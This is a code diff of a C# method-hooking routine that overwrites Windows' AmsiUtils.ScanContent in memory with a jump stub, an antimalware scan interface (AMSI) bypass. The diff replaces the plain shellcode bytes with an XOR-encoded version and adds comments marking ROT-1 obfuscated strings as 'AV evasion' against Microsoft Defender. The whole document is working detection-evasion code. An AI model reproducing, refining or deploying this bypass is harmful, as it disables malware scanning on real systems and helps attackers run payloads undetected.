@@ -47,8 +47,8 @@ namespace Editor {
             IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
             IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
 
-            //Generate architecture specific shellcode
-            byte[] patch = null;
+            //Generate architecture specific shellcode (ORIGINAL)
+            /*byte[] patch = null;
             if (IntPtr.Size == 8) {
                 patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };  //MDSE  gl\
                 byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
@@ -61,27 +61,49 @@ namespace Editor {
                 for (int i = 0; i < address.Length; i++) {
                     patch[i + 1] = address[i];
                 }
+            }*/
+
+            //Generate architecture specific shellcode Encoded / "Encrypted"
+            byte[] ptch = null;
+            if (IntPtr.Size == 8)
+            {
+
+                ptch = XOR("INVjb25jZWl2YSOThg==", keyX);
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
+                for (int i = 0; i < address.Length; i++)
+                {
+                    ptch[i + 2] = address[i];
+                }
+            }
+            else
+            {
+                ptch = XOR("AW5jb26g", keyX);
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
+                for (int i = 0; i < address.Length; i++)
+                {
+                    ptch[i + 1] = address[i];
+                }
             }
 
             //Temporarily change permissions to RWE
             uint oldprotect;
-            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) { //MDE may flag on this
+            if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, 0x40, out oldprotect)) { //MDE may flag on this
                 throw new Win32Exception();
             }
 
             //Apply the patch
             IntPtr written = IntPtr.Zero;
-            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
+            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, ptch, (uint)ptch.Length, out written)) {
                 throw new Win32Exception();
             }
 
             //Flush insutruction cache to make sure our new code executes
-            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
+            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)ptch.Length)) {
                 throw new Win32Exception();
             }
 
             //Restore the original memory protection settings
-            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
+            if (!VirtualProtect(originalSite, (UIntPtr)ptch.Length, oldprotect, out oldprotect)) {
                 throw new Win32Exception();
             }
         }
@@ -89,7 +111,7 @@ namespace Editor {
         private static string Transform(string input) {
             StringBuilder builder = new StringBuilder(input.Length + 1);    
             foreach(char c in input) {
-                char m = (char)((int)c - 1);
+                char m = (char)((int)c - 1); //ROT 1
                 builder.Append(m);
             }
             return builder.ToString();
@@ -102,12 +124,12 @@ namespace Editor {
         private static extern IntPtr GetCurrentProcess();
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); //MDE flags this
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); //MDE may flag on this
 
         [DllImport("kernel32.dll", SetLastError = true)]
         private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
 
-        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
-        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
+        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt"); //AV evasion for System Management Automation AMSIUtils
+        private static readonly string METHOD = Methods.Transform("TdboDpoufou");   //AV evasion for Scan Content Stub
     }
 }
